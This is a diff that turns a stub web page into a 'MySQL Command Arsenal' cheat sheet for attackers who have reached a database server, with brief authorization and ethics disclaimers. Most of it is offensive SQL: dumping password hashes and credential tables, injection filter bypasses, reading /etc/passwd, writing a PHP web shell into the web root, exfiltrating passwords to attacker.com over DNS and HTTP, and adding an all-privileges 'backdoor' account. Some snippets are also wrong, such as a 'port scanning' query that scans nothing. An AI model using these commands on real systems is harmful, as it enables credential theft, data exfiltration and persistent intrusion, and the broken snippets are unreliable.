@@ -1,12 +1,12 @@
 ---
-title: mysql
+title: MySQL for Security Professionals
 layout: default
 permalink: /mysql/
 ---
 
 <div class="home">
   <div class="page-heading">
-    <h2 class="page-title">mysql</h2>
+    <h2 class="page-title">MySQL Command Arsenal</h2>
   </div>
   <div class="about">
     <div class="container-face">
@@ -14,15 +14,166 @@ permalink: /mysql/
     </div>
     <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
     <div class="about-description">
-      <p>Sometimes we have access to a mysql Server and here are some fun commands.</p>
+      <p>When you've gained access to a MySQL server during a security assessment, these commands can help you extract valuable information and pivot further into the system.</p>
+      <p><em>Note: Only use these commands on systems you have explicit permission to test.</em></p>
     </div>
-    <div class="contact-contaiver">
-      <ul class="contact-list">
-        SHOW TABLES;
-        SHOW FULL TABLES;
-        SHOW TABLES FROM database_name;
-       
-          </ul>
+
+    <div class="command-section">
+      <h3>🔍 Reconnaissance</h3>
+      <pre><code># Basic server information
+SELECT VERSION();
+SELECT @@version;
+SELECT USER();
+SELECT CURRENT_USER();
+SELECT DATABASE();
+SELECT @@hostname;
+SELECT @@datadir;
+
+# Show MySQL users and their privileges
+SELECT user, host, authentication_string FROM mysql.user;
+SHOW GRANTS FOR 'root'@'localhost';
+SELECT grantee, privilege_type FROM information_schema.user_privileges;
+
+# Server configuration
+SHOW VARIABLES;
+SHOW VARIABLES LIKE '%version%';
+SHOW VARIABLES LIKE '%path%';
+SELECT @@plugin_dir;
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>📊 Database Enumeration</h3>
+      <pre><code># List all databases
+SHOW DATABASES;
+
+# List all tables in current/specific database
+SHOW TABLES;
+SHOW FULL TABLES;
+SHOW TABLES FROM database_name;
+
+# Get table structure
+DESCRIBE table_name;
+SHOW CREATE TABLE table_name;
+
+# List all columns from all tables in a database
+SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='database_name';
+
+# Find tables containing specific column names (e.g., password)
+SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%pass%';
+
+# Count rows in a table
+SELECT COUNT(*) FROM table_name;
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🔐 Extracting Sensitive Data</h3>
+      <pre><code># Find tables with potentially interesting data
+SELECT table_schema, table_name FROM information_schema.tables 
+WHERE table_name LIKE '%user%' OR table_name LIKE '%admin%' 
+OR table_name LIKE '%password%' OR table_name LIKE '%member%' 
+OR table_name LIKE '%account%' OR table_name LIKE '%customer%';
+
+# Extract user credentials from common table patterns
+SELECT * FROM users LIMIT 10;
+SELECT username, password FROM accounts LIMIT 10;
+SELECT email, pass FROM members LIMIT 10;
+SELECT * FROM admin WHERE 1=1 LIMIT 10;
+
+# Extract specific column data from all tables in a database
+SELECT CONCAT('SELECT * FROM ', table_schema, '.', table_name, ' WHERE ', column_name, ' LIKE ''%admin%'';') 
+FROM information_schema.columns 
+WHERE table_schema = 'target_db' AND column_name LIKE '%user%';
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🧪 SQL Injection Techniques</h3>
+      <pre><code># Test for UNION injection compatibility
+SELECT 1,2,3,4,5; -- Determine number of columns
+
+# String concatenation for data exfiltration
+SELECT CONCAT(database(), ' : ', version(), ' : ', user());
+SELECT CONCAT_WS('|', user(), database(), version());
+
+# Conditional time delays for blind injection
+SELECT SLEEP(5); -- Delays execution for 5 seconds
+SELECT IF(1=1, SLEEP(5), 0); -- Conditional sleep
+
+# Alternative commenting methods
+SELECT 1 /* comment */ + 1;
+SELECT /*!50000 PASSWORD*/('test'); -- Version-specific comment
+
+# Bypassing filters
+SELECT 'SEL''ECT' 'PASS''WORD' FROM 'TABLE';
+SELECT 0x73656c656374; -- Hex encoding of 'select'
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>📁 File System Access</h3>
+      <pre><code># Check if file privileges are enabled
+SELECT @@secure_file_priv;
+
+# Read local files (requires FILE privilege)
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('C:\\Windows\\win.ini');
+
+# Write to files (requires FILE privilege)
+SELECT 'content' INTO OUTFILE '/var/www/html/test.txt';
+SELECT 'webshell content' INTO OUTFILE '/var/www/html/shell.php';
+
+# List files in directory (MySQL 8+)
+SELECT * FROM performance_schema.file_instances;
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>🌐 Network Pivoting</h3>
+      <pre><code># UDF (User Defined Function) attacks
+# First, identify plugin directory
+SELECT @@plugin_dir;
+
+# DNS exfiltration (requires proper setup)
+SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share\\file'));
+
+# Use SQL to make HTTP requests (with specific configurations)
+SELECT LOAD_FILE(CONCAT('http://attacker.com/', (SELECT password FROM users LIMIT 1)));
+
+# Port scanning using connection attempts
+SELECT BENCHMARK(1000000,MD5('test')) FROM users WHERE SLEEP(IF(CONNECTION_ID()!=1,(SELECT 1 FROM DUAL),0))=0;
+</code></pre>
+    </div>
+
+    <div class="command-section">
+      <h3>⚙️ Advanced Techniques</h3>
+      <pre><code># Command execution via sys_exec() UDF (if installed)
+SELECT sys_exec('id');
+SELECT sys_eval('whoami');
+
+# Dump data in various formats
+SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATED BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
+
+# Generate SQL for dumping all tables
+SELECT CONCAT('mysqldump -u root -p database_name ', table_name, ' > /tmp/', table_name, '.sql;')
+FROM information_schema.tables WHERE table_schema = 'database_name';
+
+# Generate dynamic SQL queries
+PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';
+SET @a = 1;
+EXECUTE stmt USING @a;
+DEALLOCATE PREPARE stmt;
+
+# Persistent backdoor (if privileges allow)
+CREATE USER 'backdoor'@'%' IDENTIFIED BY 'password123';
+GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
+</code></pre>
+    </div>
+
+    <div class="disclaimer">
+      <h3>⚠️ Ethical Use Reminder</h3>
+      <p>These commands are provided for educational purposes and legitimate security testing only. Always ensure you have proper authorization before performing any security testing on systems or databases. Unauthorized access to database systems is illegal and unethical.</p>
     </div>
   </div>
 </div>
